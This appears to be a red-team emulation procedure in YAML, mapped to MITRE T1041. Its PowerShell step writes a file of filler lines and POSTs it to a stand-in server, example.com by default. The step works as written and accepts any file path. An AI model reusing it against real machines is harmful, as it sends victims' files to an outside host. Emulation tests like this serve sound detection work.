api_version: "2.0"
name: C2 Data Exfiltration
description: |
    Exfiltrates a file present on the victim machine to the C2 server.
args:
    - name: destination_url
      type: string
      default: example.com
    - name: filepath
      type: path
      default: $env:TEMP\LineNumbers.txt
uuid: d1253f6e-c29b-49dc-b466-2147a6191932
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1041: Exfiltration Over C2 Channel'
requirements:
    platforms:
        - os: windows
steps:
    - name: c2-data-exfiltration
      inline: "if(-not (Test-Path {{.Args.filepath}})){ \n  1..100 | ForEach-Object { Add-Content -Path {{.Args.filepath}} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path {{.Args.filepath}}\nInvoke-WebRequest -Uri {{.Args.destination_url}} -Method POST -Body $filecontent -DisableKeepAlive\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
